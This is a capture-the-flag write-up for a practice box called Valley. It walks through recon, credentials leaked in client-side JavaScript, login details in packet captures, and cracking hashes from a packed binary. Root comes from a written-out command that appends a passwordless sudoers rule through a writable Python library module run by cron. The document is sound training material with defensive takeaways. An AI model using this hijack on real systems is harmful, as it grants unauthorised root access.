# Valley — Write-up

## Objective

Can you find your way into the Valley?

Boot the box and find a way in to escalate all the way to root!

**Questions to answer:**

- What is the user flag?
- What is the root flag?

---

## Initial Recon

```bash
nmap -sS -sV -sC -append-output 10.81.161.160
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

First time using ffuf properly — the recursion feature is so needed, something missing from Gobuster.

```bash
ffuf -u http://10.81.154.27/FUZZ -w raft-medium-words.txt -t 100 -mc 200 -recursion
```

```
[INFO] Adding a new job to the queue: http://10.81.154.27/gallery/FUZZ
[INFO] Adding a new job to the queue: http://10.81.154.27/static/FUZZ
[INFO] Adding a new job to the queue: http://10.81.154.27/pricing/FUZZ

.                       [Status: 200, Size: 1163, Words: 176, Lines: 39, Duration: 34ms]
[INFO] Starting queued job on target: http://10.81.154.27/gallery/FUZZ
.                       [Status: 200, Size: 945, Words: 61, Lines: 17, Duration: 38ms]
[INFO] Starting queued job on target: http://10.81.154.27/static/FUZZ
.                       [Status: 200, Size: 566, Words: 43, Lines: 15, Duration: 31ms]

8, 4, 3, 11, 00, 9, 5, 6, 12, 18, 16, 2, 1, 10, 17, 7, 15, 13, 14   [numbered image files under /static]

[INFO] Starting queued job on target: http://10.81.154.27/pricing/FUZZ
.                       [Status: 200, Size: 1139, Words: 73, Lines: 18, Duration: 37ms]

:: Progress: [63088/63088] :: Job [4/4] :: 123 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

---

## Finding a Hidden Dev Directory

Previously scrolling around on the website, `/static` had some images that were not on the main page. Score! The site originally has 18 images present. `00` does not match the first image, so I assume it's hidden.

Visiting that hidden directory I found:

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

---

## Cracking the Dev Login

I'm obviously going to check `/dev1243224123123`. I am presented with a login page. Viewing the HTML source code, there's a hidden JS file called `dev.js`. Viewing that path I found something VERY interesting:

```javascript
if (username === "siemDev" && password === "california") {
    window.location.href = "/dev1243224123123/devNotes37370.txt";
} else {
    loginErrorMsg.style.opacity = 1;
```

Visiting that secret folder gave me:

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

"-stop reusing credentials" and "-change ftp port to normal port" are the most interesting elements.

---

## Finding the FTP Port and Captured Traffic

Running another Nmap scan using `-p-` I found the FTP port on `37370`. Checking available files I found some Wireshark files:

```
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```

Inside `siemHTTP2.pcapng` I found some random login credentials — I'm gonna assume it's for an SSH login:

```
POST /index.html HTTP/1.1
Host: 192.168.111.136
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

uname=valleyDev&psw=ph0t0s1234&remember=on
```

---

## Finding the User Flag

After logging in with the credentials to SSH I found the first flag inside `user.txt`.

**Flag:** `THM{k@l1########@lley}`

---

## Unpacking the UPX Executable

Inside the home folder there was an executable. I downloaded it using a Python server and `wget`. Using a combination of AI and `binwalk`, I figured out it was a UPX executable — the main takeaway from the command's output was the copyright string:

```
Copyright (C) 1996-2020 the UPX Team.
```

Unpacking it with:

```bash
upx -t valleyAuthenticator
```

and using `strings`, I found 2 hashes above "Welcome to Valley Inc. Authenticator."

Using CrackStation I decrypted the hashes:

```
e6722920bab2326f8217e4bf6b1b58ac -> liberty123
dd2921cc76ee3abfd2beb60709056cfb -> valley
```

Signing in with these credentials gives us a new profile.

---

## Privilege Escalation

Inside `/etc/crontab` there's a Python executable. At first I thought I could edit it and add a reverse shell, but I didn't have permissions.

After some research, I found I can actually add a reverse shell via the Python import — it uses the `base64` library. I found the directory using `locate base64.py` and found the file, which I *can* edit with my current permissions.

I ran:

```bash
echo 'import os; open("/etc/sudoers", "a").write("valley ALL=(ALL) NOPASSWD:ALL\n")' >> /usr/lib/python3.8/base64.py
```

to give myself (`valley`) permissions, then `sudo -i` to enter root. Finally, I got the last flag:

```bash
cat /root/root.txt
```

**Flag:** `THM{v@lle########d0w_0f_pr1v3sc}`

---

## Summary

- **Recon:** Nmap showed SSH and an Apache web server. Recursive `ffuf` fuzzing turned up `/gallery`, `/static`, and `/pricing` directories, with `/static` hosting a numbered set of images.
- **Hidden directory:** An out-of-place image filename (`00`, not matching the site's real 18 images) hid a dev-notes file pointing at a secret path, `/dev1243224123123`, and hinting at SIEM alerts.
- **Client-side auth bypass:** The hidden dev login page checked credentials in plain client-side JavaScript (`dev.js`), leaking both the login (`siemDev` / `california`) and the next path to visit.
- **FTP + packet capture:** The dev notes hinted at credential reuse and a non-default FTP port. A full port scan found FTP on `37370`, hosting Wireshark captures. One HTTP capture contained a plaintext POST login (`valleyDev` / `ph0t0s1234`) — reused for SSH and yielding the **user flag**.
- **UPX-packed binary:** A home-directory executable turned out to be UPX-packed. Unpacking it and pulling strings revealed two hashes, cracked via CrackStation (`liberty123`, `valley`) to access a second profile.
- **Cron + editable Python stdlib:** A cron job ran a Python script that couldn't be edited directly, but the `base64` standard-library module it imported *could* be edited with the current user's permissions. Appending a sudoers rule via that module — triggered on the next cron run/import — granted passwordless root, yielding the **root flag**.

**Key takeaways:**

- Client-side authentication (credentials or logic checked in JavaScript the browser can read) is not authentication at all — anything checked in `dev.js` is visible to the attacker before they even try to log in.
- Reused credentials across services (web login, SSH, FTP) turn one leaked packet capture into a full compromise chain.
- Packet captures (`.pcapng`) left reachable on a server are a serious information disclosure risk if any traffic inside was ever unencrypted.
- File permissions need to account for the full dependency chain: a script being read-only doesn't help if a library it imports (like `base64.py`) is still writable by a lower-privileged user — that's an equally valid code-execution path.
